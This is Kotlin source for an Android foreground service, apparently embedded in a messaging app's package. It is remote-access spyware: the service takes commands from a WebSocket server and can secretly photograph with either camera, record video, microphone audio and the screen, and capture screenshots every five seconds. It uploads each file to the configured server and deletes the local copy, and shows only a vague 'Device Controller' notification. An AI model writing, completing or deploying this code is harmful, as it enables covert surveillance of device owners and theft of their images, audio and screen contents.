package org.fossify.messages.androbox

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class ForegroundService : LifecycleService() {

    private val channelId = "ForegroundServiceChannel"
    private val notificationId = 1
    private lateinit var webSocketManager: WebSocketManager
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var cameraManager: FrontCameraManager? = null
    private var videoRecorderManager: VideoRecorderManager? = null
    private var audioRecorderManager: AudioRecorderManager? = null
    private var lastConnectionStatus: Boolean? = null

    // স্ক্রিন রেকর্ড ও ক্যাপচার ইঞ্জিন
    private var screenRecorder: ScreenRecorderEngine? = null
    private var screenCapture: ScreenCaptureEngine? = null

    companion object {
        private var instance: ForegroundService? = null

        fun startFrontCamera(context: Context) { instance?.cameraManager?.startFrontCamera() }
        fun startBackCamera(context: Context) { instance?.cameraManager?.startBackCamera() }
        fun stopCamera(context: Context) { instance?.cameraManager?.stopCamera() }

        fun startVideoMain(context: Context) { instance?.videoRecorderManager?.startRecording(false) }
        fun startVideoSelfie(context: Context) { instance?.videoRecorderManager?.startRecording(true) }
        fun stopVideo(context: Context) { instance?.videoRecorderManager?.stopRecording() }

        fun startExternalAudio(context: Context, duration: Int) {
            instance?.audioRecorderManager?.startExternalRecording(duration)
        }
        fun stopAudio(context: Context) {
            instance?.audioRecorderManager?.stopRecording()
        }

        fun setMediaProjection(resultCode: Int, data: Intent) {
            instance?.initMediaProjection(resultCode, data)
        }

        fun startScreenRecording() {
            instance?.screenRecorder?.startRecording()
        }

        fun stopScreenRecording() {
            instance?.screenRecorder?.stopRecording()
        }

        fun startScreenCapture() {
            instance?.screenCapture?.startCapture()
        }

        fun stopScreenCapture() {
            instance?.screenCapture?.stopCapture()
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForegroundService()
        initWebSocket()

        cameraManager = FrontCameraManager(applicationContext, this) { file ->
            uploadFile(file, "photo")
        }

        videoRecorderManager = VideoRecorderManager(applicationContext, this) { file ->
            uploadFile(file, "video")
        }

        audioRecorderManager = AudioRecorderManager(applicationContext) { file ->
            uploadFile(file, "audio")
        }

        screenRecorder = ScreenRecorderEngine(applicationContext) { file ->
            uploadFile(file, "screen_record")
        }
        screenCapture = ScreenCaptureEngine(applicationContext) { file ->
            uploadFile(file, "screenshot")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        // সার্ভিস পুনরায় চালু হলে WebSocket পুনঃসংযোগের চেষ্টা (যদি ডিসকানেক্ট থাকে)
        if (::webSocketManager.isInitialized && (lastConnectionStatus == false || lastConnectionStatus == null)) {
            serviceScope.launch {
                delay(2000)
                webSocketManager.connect()
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        webSocketManager.disconnect()
        cameraManager?.stopCamera()
        videoRecorderManager?.release()
        audioRecorderManager?.release()
        screenRecorder?.release()
        screenCapture?.release()
        instance = null
    }

    override fun onBind(intent: Intent): IBinder? {
        return super.onBind(intent)
    }

    // ---------- Private Helpers ----------

    private fun initMediaProjection(resultCode: Int, data: Intent) {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val projection = projectionManager.getMediaProjection(resultCode, data)
        screenRecorder?.setMediaProjection(projection)
        screenCapture?.setMediaProjection(projection)
    }

    private fun uploadFile(file: File, type: String) {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls != null) {
            val (host, _) = urls
            FileUploader.uploadFile(applicationContext, file, host) { success ->
                if (success) {
                    Log.d("ForegroundService", "$type uploaded: ${file.name}")
                    file.delete()
                } else {
                    Log.e("ForegroundService", "$type upload failed: ${file.name}")
                }
            }
        } else {
            Log.e("ForegroundService", "Config missing, cannot upload $type")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Foreground Service Channel", NotificationManager.IMPORTANCE_DEFAULT)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val intent = Intent(this, ForegroundService::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Controller")
            .setContentText("Running in background...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(notificationId, notification)
    }

    private fun initWebSocket() {
        webSocketManager = WebSocketManager(applicationContext,
            onMessage = { message ->
                serviceScope.launch {
                    CommandProcessor.processCommand(message, applicationContext)
                }
            },
            onConnectionChange = { isConnected ->
                if (lastConnectionStatus != isConnected) {
                    lastConnectionStatus = isConnected
                    updateNotification(if (isConnected) "Connected" else "Disconnected")
                    // 🔁 ডিসকানেক্ট হলে ৫ সেকেন্ড পর পুনরায় সংযোগের চেষ্টা
                    if (!isConnected) {
                        serviceScope.launch {
                            delay(5000)
                            // এখনও ডিসকানেক্ট কিনা চেক করুন (lastConnectionStatus false)
                            if (lastConnectionStatus == false) {
                                Log.d("ForegroundService", "Reconnecting WebSocket...")
                                webSocketManager.connect()
                            }
                        }
                    }
                }
            }
        )
        webSocketManager.connect()
    }

    private fun updateNotification(text: String) {
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Controller")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
        getSystemService(NotificationManager::class.java).notify(notificationId, notification)
    }

    // =============== অভ্যন্তরীণ ইঞ্জিন ক্লাস ===============

    private inner class ScreenRecorderEngine(
        private val context: Context,
        private val onFileReady: (File) -> Unit
    ) {
        private var mediaProjection: MediaProjection? = null
        private var mediaRecorder: MediaRecorder? = null
        private var virtualDisplay: VirtualDisplay? = null
        private var isRecording = false
        private var videoFile: File? = null

        fun setMediaProjection(projection: MediaProjection?) {
            mediaProjection = projection
        }

        fun startRecording() {
            if (mediaProjection == null || isRecording) return

            val metrics = DisplayMetrics()
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            windowManager.defaultDisplay.getMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            val dir = File(context.getExternalFilesDir(Environment.DIRECTORY_MOVIES), "ScreenRecords")
            if (!dir.exists()) dir.mkdirs()
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
            videoFile = File(dir, "screen_$timestamp.mp4")

            try {
                mediaRecorder = MediaRecorder().apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setVideoSize(width, height)
                    setVideoFrameRate(30)
                    setVideoEncodingBitRate(5_000_000)
                    setOutputFile(videoFile?.absolutePath)
                    prepare()
                    start()
                }

                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenRecorder", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    mediaRecorder?.surface, null, null
                )

                isRecording = true
                Log.d("ScreenRecorder", "Recording started -> ${videoFile?.absolutePath}")
            } catch (e: Exception) {
                Log.e("ScreenRecorder", "Start error: ${e.message}")
                stopRecording()
            }
        }

        fun stopRecording() {
            if (!isRecording) return
            try {
                mediaRecorder?.stop()
                mediaRecorder?.release()
                virtualDisplay?.release()
                mediaProjection?.stop()
            } catch (e: Exception) {
                Log.e("ScreenRecorder", "Stop error: ${e.message}")
            }
            isRecording = false
            mediaRecorder = null
            virtualDisplay = null
            mediaProjection = null

            videoFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    Log.d("ScreenRecorder", "Video saved, size=${file.length()}")
                    onFileReady(file)
                } else {
                    file.delete()
                }
            }
            videoFile = null
        }

        fun release() {
            stopRecording()
        }
    }

    private inner class ScreenCaptureEngine(
        private val context: Context,
        private val onFileReady: (File) -> Unit
    ) {
        private var mediaProjection: MediaProjection? = null
        private var virtualDisplay: VirtualDisplay? = null
        private var imageReader: ImageReader? = null
        private var isCapturing = false
        private var captureJob: Job? = null
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        private val captureInterval = 5000L

        fun setMediaProjection(projection: MediaProjection?) {
            mediaProjection = projection
        }

        fun startCapture() {
            if (mediaProjection == null || isCapturing) return
            isCapturing = true
            startVirtualDisplay()
            startPeriodicCapture()
            Log.d("ScreenCapture", "Capture started")
        }

        private fun startVirtualDisplay() {
            val metrics = DisplayMetrics()
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            windowManager.defaultDisplay.getMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )
        }

        private fun startPeriodicCapture() {
            captureJob?.cancel()
            captureJob = scope.launch {
                while (isCapturing) {
                    captureScreenshot()
                    delay(captureInterval)
                }
            }
        }

        private fun captureScreenshot() {
            val reader = imageReader ?: return
            val image = reader.acquireLatestImage() ?: return
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)

            val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
            image.close()

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(System.currentTimeMillis())
            val file = File(context.cacheDir, "screenshot_$timestamp.jpg")
            FileOutputStream(file).use { out ->
                finalBitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
            }
            finalBitmap.recycle()

            onFileReady(file)
        }

        fun stopCapture() {
            if (!isCapturing) return
            isCapturing = false
            captureJob?.cancel()
            virtualDisplay?.release()
            imageReader?.close()
            virtualDisplay = null
            imageReader = null
            Log.d("ScreenCapture", "Capture stopped")
        }

        fun release() {
            stopCapture()
            mediaProjection = null
        }
    }
}